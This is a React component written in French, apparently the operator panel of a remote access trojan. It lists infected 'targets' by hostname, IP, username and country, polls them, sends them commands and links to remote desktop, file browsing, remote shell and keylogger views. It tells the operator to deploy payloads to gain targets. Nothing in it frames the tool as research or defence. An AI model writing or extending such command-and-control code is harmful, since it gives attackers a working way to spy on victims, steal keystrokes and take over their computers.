import React, { useState, useEffect } from 'react';
import { Link } from 'react-router-dom';
import {
  Target,
  Monitor,
  FolderOpen,
  Terminal,
  Info,
  Key,
  Play,
  Pause,
  Trash2,
  RefreshCw,
  Globe,
  Clock,
  HardDrive,
  Cpu,
  Eye,
  Search
} from 'lucide-react';
import axios from 'axios';
import toast from 'react-hot-toast';

const TargetsManager = () => {
  const [targets, setTargets] = useState([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');
  const [filterStatus, setFilterStatus] = useState('all');

  useEffect(() => {
    fetchTargets();
    const interval = setInterval(fetchTargets, 10000); // Refresh every 10 seconds
    return () => clearInterval(interval);
  }, []);

  const fetchTargets = async () => {
    try {
      const response = await axios.get('/api/targets');
      setTargets(response.data.targets || []);
    } catch (error) {
      console.error('Erreur lors du chargement des cibles:', error);
      toast.error('Erreur lors du chargement des cibles');
    } finally {
      setLoading(false);
    }
  };

  const sendCommand = async (targetId, command) => {
    try {
      await axios.post(`/api/targets/${targetId}/command`, { command });
      toast.success(`Commande "${command}" envoyée`);
    } catch (error) {
      toast.error('Erreur lors de l\'envoi de la commande');
    }
  };

  const filteredTargets = targets.filter(target => {
    const matchesSearch = target.hostname?.toLowerCase().includes(searchTerm.toLowerCase()) ||
                         target.ip?.includes(searchTerm) ||
                         target.username?.toLowerCase().includes(searchTerm.toLowerCase());
    
    const matchesFilter = filterStatus === 'all' || target.status === filterStatus;
    
    return matchesSearch && matchesFilter;
  });

  const getStatusColor = (status) => {
    switch (status) {
      case 'online': return 'text-discord-green';
      case 'offline': return 'text-discord-red';
      case 'away': return 'text-discord-yellow';
      default: return 'text-discord-gray-500';
    }
  };

  const getStatusDot = (status) => {
    switch (status) {
      case 'online': return 'status-online';
      case 'offline': return 'status-offline';
      case 'away': return 'status-away';
      default: return 'status-offline';
    }
  };

  const formatLastSeen = (timestamp) => {
    if (!timestamp) return 'Jamais';
    const date = new Date(timestamp);
    const now = new Date();
    const diff = now - date;
    
    if (diff < 60000) return 'À l\'instant';
    if (diff < 3600000) return `${Math.floor(diff / 60000)} min`;
    if (diff < 86400000) return `${Math.floor(diff / 3600000)} h`;
    return date.toLocaleDateString('fr-FR');
  };

  // Mock data for demonstration since we don't have real targets yet
  const mockTargets = [
    {
      _id: '1',
      hostname: 'DESKTOP-ABC123',
      ip: '192.168.1.100',
      username: 'Admin',
      os: 'Windows 10 Pro',
      status: 'online',
      last_seen: new Date().toISOString(),
      country: 'France',
      cpu: 'Intel Core i7-8700K',
      ram: '16 GB',
      uptime: '2d 14h 32m'
    },
    {
      _id: '2',
      hostname: 'LAPTOP-XYZ789',
      ip: '192.168.1.105',
      username: 'User',
      os: 'Windows 11 Home',
      status: 'away',
      last_seen: new Date(Date.now() - 900000).toISOString(),
      country: 'Belgique',
      cpu: 'AMD Ryzen 5 3600',
      ram: '8 GB',
      uptime: '5h 21m'
    },
    {
      _id: '3',
      hostname: 'PC-GAMING',
      ip: '192.168.1.110',
      username: 'Gamer',
      os: 'Windows 10 Pro',
      status: 'offline',
      last_seen: new Date(Date.now() - 3600000).toISOString(),
      country: 'Suisse',
      cpu: 'Intel Core i9-9900K',
      ram: '32 GB',
      uptime: '0'
    }
  ];

  const displayTargets = targets.length > 0 ? filteredTargets : mockTargets.filter(target => {
    const matchesSearch = target.hostname?.toLowerCase().includes(searchTerm.toLowerCase()) ||
                         target.ip?.includes(searchTerm) ||
                         target.username?.toLowerCase().includes(searchTerm.toLowerCase());
    
    const matchesFilter = filterStatus === 'all' || target.status === filterStatus;
    
    return matchesSearch && matchesFilter;
  });

  const QuickActionButton = ({ icon: Icon, label, onClick, color = "discord-button-secondary" }) => (
    <button
      onClick={onClick}
      className={`${color} p-2 rounded-lg flex items-center space-x-1 text-xs`}
      title={label}
    >
      <Icon className="w-4 h-4" />
      <span className="hidden sm:inline">{label}</span>
    </button>
  );

  return (
    <div className="space-y-6 fade-in">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between">
        <div>
          <h1 className="text-2xl font-bold text-white mb-2">Gestion des Cibles</h1>
          <p className="text-discord-light">Surveillez et contrôlez vos cibles connectées</p>
        </div>
        <div className="mt-4 sm:mt-0 flex items-center space-x-3">
          <button
            onClick={fetchTargets}
            className="discord-button-secondary flex items-center space-x-2"
            disabled={loading}
          >
            <RefreshCw className={`w-4 h-4 ${loading ? 'animate-spin' : ''}`} />
            <span>Actualiser</span>
          </button>
        </div>
      </div>

      {/* Filters */}
      <div className="flex flex-col sm:flex-row gap-4">
        <div className="flex-1">
          <div className="relative">
            <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-discord-gray-500 w-4 h-4" />
            <input
              type="text"
              placeholder="Rechercher par nom, IP ou utilisateur..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              className="discord-input pl-10"
            />
          </div>
        </div>
        <div className="sm:w-48">
          <select
            value={filterStatus}
            onChange={(e) => setFilterStatus(e.target.value)}
            className="discord-input"
          >
            <option value="all">Tous les statuts</option>
            <option value="online">En ligne</option>
            <option value="away">Absent</option>
            <option value="offline">Hors ligne</option>
          </select>
        </div>
      </div>

      {/* Stats Cards */}
      <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
        <div className="discord-card text-center">
          <div className="text-2xl font-bold text-white">{displayTargets.length}</div>
          <div className="text-sm text-discord-light">Total</div>
        </div>
        <div className="discord-card text-center">
          <div className="text-2xl font-bold text-discord-green">
            {displayTargets.filter(t => t.status === 'online').length}
          </div>
          <div className="text-sm text-discord-light">En ligne</div>
        </div>
        <div className="discord-card text-center">
          <div className="text-2xl font-bold text-discord-yellow">
            {displayTargets.filter(t => t.status === 'away').length}
          </div>
          <div className="text-sm text-discord-light">Absent</div>
        </div>
        <div className="discord-card text-center">
          <div className="text-2xl font-bold text-discord-red">
            {displayTargets.filter(t => t.status === 'offline').length}
          </div>
          <div className="text-sm text-discord-light">Hors ligne</div>
        </div>
      </div>

      {/* Targets List */}
      <div className="discord-card">
        {loading ? (
          <div className="space-y-4">
            {[...Array(3)].map((_, i) => (
              <div key={i} className="animate-pulse flex space-x-4 p-4">
                <div className="w-4 h-4 bg-discord-gray-600 rounded-full"></div>
                <div className="flex-1 space-y-2">
                  <div className="h-4 bg-discord-gray-600 rounded w-1/3"></div>
                  <div className="h-3 bg-discord-gray-600 rounded w-1/2"></div>
                </div>
              </div>
            ))}
          </div>
        ) : displayTargets.length === 0 ? (
          <div className="text-center py-12">
            <Target className="w-16 h-16 text-discord-gray-500 mx-auto mb-4" />
            <h3 className="text-lg font-medium text-white mb-2">Aucune cible trouvée</h3>
            <p className="text-discord-light">
              {searchTerm || filterStatus !== 'all' ? 
                'Aucune cible ne correspond à vos critères de recherche.' :
                'Commencez par déployer vos payloads pour voir les cibles connectées.'
              }
            </p>
          </div>
        ) : (
          <div className="space-y-4">
            {displayTargets.map((target) => (
              <div key={target._id} className="border border-discord-gray-700 rounded-lg p-4 hover:bg-discord-gray-700 transition-colors">
                <div className="flex items-center justify-between">
                  <div className="flex items-center space-x-4">
                    <div className={getStatusDot(target.status)}></div>
                    <div>
                      <div className="flex items-center space-x-2">
                        <h3 className="text-white font-medium">{target.hostname}</h3>
                        <span className="text-discord-light text-sm">({target.ip})</span>
                      </div>
                      <div className="flex items-center space-x-4 mt-1 text-sm text-discord-light">
                        <span>{target.username}@{target.os}</span>
                        <span className="flex items-center space-x-1">
                          <Globe className="w-3 h-3" />
                          <span>{target.country}</span>
                        </span>
                        <span className="flex items-center space-x-1">
                          <Clock className="w-3 h-3" />
                          <span>{formatLastSeen(target.last_seen)}</span>
                        </span>
                      </div>
                    </div>
                  </div>

                  <div className="flex items-center space-x-2">
                    <span className={`text-sm font-medium ${getStatusColor(target.status)}`}>
                      {target.status === 'online' ? 'En ligne' : 
                       target.status === 'away' ? 'Absent' : 'Hors ligne'}
                    </span>
                    
                    {target.status === 'online' && (
                      <div className="flex items-center space-x-1">
                        <Link to={`/remote-desktop/${target._id}`}>
                          <QuickActionButton icon={Monitor} label="Bureau" />
                        </Link>
                        <Link to={`/file-manager/${target._id}`}>
                          <QuickActionButton icon={FolderOpen} label="Fichiers" />
                        </Link>
                        <Link to={`/remote-shell/${target._id}`}>
                          <QuickActionButton icon={Terminal} label="Shell" />
                        </Link>
                        <Link to={`/system-info/${target._id}`}>
                          <QuickActionButton icon={Info} label="Info" />
                        </Link>
                        <Link to={`/keylogger/${target._id}`}>
                          <QuickActionButton icon={Key} label="Keylogger" />
                        </Link>
                      </div>
                    )}
                  </div>
                </div>

                {/* System Info */}
                <div className="mt-3 pt-3 border-t border-discord-gray-600">
                  <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm">
                    <div className="flex items-center space-x-2">
                      <Cpu className="w-4 h-4 text-discord-blurple" />
                      <span className="text-discord-light">{target.cpu}</span>
                    </div>
                    <div className="flex items-center space-x-2">
                      <HardDrive className="w-4 h-4 text-discord-green" />
                      <span className="text-discord-light">{target.ram}</span>
                    </div>
                    <div className="flex items-center space-x-2">
                      <Clock className="w-4 h-4 text-discord-yellow" />
                      <span className="text-discord-light">Uptime: {target.uptime}</span>
                    </div>
                    <div className="flex items-center justify-end space-x-2">
                      <button
                        onClick={() => sendCommand(target._id, 'ping')}
                        className="text-discord-blurple hover:text-discord-blurple-dark"
                        title="Tester la connexion"
                      >
                        <Eye className="w-4 h-4" />
                      </button>
                    </div>
                  </div>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
};

export default TargetsManager;